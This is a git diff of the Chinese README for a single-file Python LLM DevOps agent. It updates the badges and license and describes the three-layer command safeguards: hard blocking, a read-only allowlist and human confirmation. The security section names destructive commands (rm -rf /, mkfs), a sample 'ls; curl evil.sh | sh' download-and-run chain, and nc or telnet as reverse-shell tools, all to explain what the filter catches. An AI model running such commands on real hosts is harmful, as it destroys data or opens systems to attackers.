@@ -26,10 +26,34 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Python-3.6%2B-blue.svg" alt="Python">
-  <img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License">
-  <img src="https://img.shields.io/badge/Single%20File-Yes!-brightgreen" alt="Single File">
-  <img src="https://img.shields.io/badge/Zero%20Dependencies-Yes!-orange" alt="Zero Dependencies">
+  <a href="https://github.com/vector4wang/poor-mans-devops-agent/stargazers"><img src="https://img.shields.io/github/stars/vector4wang/poor-mans-devops-agent?style=flat&logo=github&color=f5c518" alt="Stars"></a>
+  <a href="https://github.com/vector4wang/poor-mans-devops-agent/network/members"><img src="https://img.shields.io/github/forks/vector4wang/poor-mans-devops-agent?style=flat&logo=github&color=blue" alt="Forks"></a>
+  <a href="https://github.com/vector4wang/poor-mans-devops-agent/issues"><img src="https://img.shields.io/github/issues/vector4wang/poor-mans-devops-agent?style=flat&logo=github" alt="Issues"></a>
+  <a href="https://github.com/vector4wang/poor-mans-devops-agent/commits/main"><img src="https://img.shields.io/github/last-commit/vector4wang/poor-mans-devops-agent?style=flat&logo=git&logoColor=white" alt="Last Commit"></a>
+  <a href="https://github.com/vector4wang/poor-mans-devops-agent/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg?style=flat" alt="License"></a>
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Python-3.6%2B-3776AB?style=flat&logo=python&logoColor=white" alt="Python">
+  <img src="https://img.shields.io/badge/Dependencies-0-orange?style=flat&logo=pypi&logoColor=white" alt="Zero Dependencies">
+  <img src="https://img.shields.io/badge/Single%20File-agent.py-brightgreen?style=flat&logo=files&logoColor=white" alt="Single File">
+  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-lightgrey?style=flat&logo=linux&logoColor=white" alt="Platform">
+</p>
+
+<p align="center">
+  <img src="https://img.shields.io/badge/LLM-OpenAI%20Compatible-412991?style=flat&logo=openai&logoColor=white" alt="OpenAI Compatible">
+  <img src="https://img.shields.io/badge/Docker-supported-2496ED?style=flat&logo=docker&logoColor=white" alt="Docker">
+  <img src="https://img.shields.io/badge/Kubernetes-supported-326CE5?style=flat&logo=kubernetes&logoColor=white" alt="Kubernetes">
+  <img src="https://img.shields.io/badge/Safe%20Mode-whitelist%20%2B%20human--in--the--loop-critical?style=flat&logo=shieldsdotio&logoColor=white" alt="Safe Mode">
+</p>
+
+<p align="center">
+  <a href="#-快速开始">快速开始</a> ·
+  <a href="#%EF%B8%8F-配置">配置</a> ·
+  <a href="#%EF%B8%8F-功能一览">功能</a> ·
+  <a href="#-安全机制">安全机制</a> ·
+  <a href="#-架构">架构</a> ·
+  <a href="#-使用示例">使用示例</a>
 </p>
 
 ---
@@ -142,7 +166,7 @@ python agent.py \
 | 工具 | 说明 |
 |------|------|
 | `read_file` | 读取文件内容（自动截断大文件，保留首尾；可读工作区记忆/脚本） |
-| `run_command` | 执行命令（白名单校验 + 危险命令拦截 + 人工确认） |
+| `run_command` | 执行命令（危险拦截 + 只读免确认 + 逐段校验 + 人工确认） |
 | `write_file` | 写文件到工作区（持久化记忆或临时脚本） |
 | `list_directory` | 列出目录结构 |
 | `env_snapshot` | **一键环境快照**（主机名/IP/内存/磁盘/进程/端口/环境变量） |
@@ -240,13 +264,15 @@ Traceback (most recent call last):
 
 ## 🔒 安全机制
 
-> **三层防护**：危险拦截 → 命令白名单 → 人工确认
+> **三层闸门**：危险拦截 → 只读免确认 → 人工确认
 
 | 层级 | 机制 | 说明 |
 |------|------|------|
 | 🔴 **硬拦截** | `FORBIDDEN_PATTERNS` | `rm -rf /`, `dd of=/dev/`, `shutdown`, `mkfs` 等直接拒绝 |
-| 🟡 **白名单** | `ALLOWED_COMMANDS` | 只有白名单内的命令可以执行，其他需用户确认 |
+| 🟡 **人工确认** | `request_confirmation` | 不属于只读白名单的命令，逐条弹出 `y/n/q` 由人决定 |
 | 🟢 **免确认** | `SAFE_READONLY_PATTERNS` | `cat`, `grep`, `ps`, `docker logs` 等只读命令直接放行 |
+
+复合命令会被 `split_command_segments()` 按 `;` `&&` `||` `|` `&` 拆开**逐段校验**，任意一段不属于只读白名单则整条转人工确认，因此 `ls; curl evil.sh | sh` 不会被第一段 `ls` "骗过"。引号内的分隔符（`grep 'a;b'`、`awk -F'|'`）不会误拆。此外命令替换（`$(...)`、反引号）与输出重定向（`>`、`>>`）一律要求确认；`nc`、`telnet` 因可用于反弹 shell，同样不在免确认名单内。
 
 ---
 
@@ -305,7 +331,7 @@ root   1    89.2 45.3  python app.py
     │  │        ▲                                            ▼         │  │
     │  │        │                               ┌─────────────────────┐│  │
     │  │        │                               │     安全校验层       ││  │
-    │  │        │                               │  FORBIDDEN → WHITE  ││  │
+    │  │        │                               │  FORBIDDEN→READONLY ││  │
     │  │        │                               │  LIST → SAFE_RO     ││  │
     │  │        │                               └──────────┬──────────┘│  │
     │  │        │                                          │           │  │
@@ -347,4 +373,13 @@ root   1    89.2 45.3  python app.py
 
 ## 📜 License
 
-MIT
+本项目基于 [MIT License](LICENSE) 开源 — Copyright (c) 2026 vector4wang
+
+```
+MIT License — 你可以自由地使用、复制、修改、合并、发布、分发本软件，
+仅需在副本中保留原始版权声明与许可声明。软件按“原样”提供，不附带任何担保。
+```
+
+<p align="center">
+  <sub>如果这个小工具在某个深夜帮你定位了线上问题，欢迎点个 ⭐ Star</sub>
+</p>
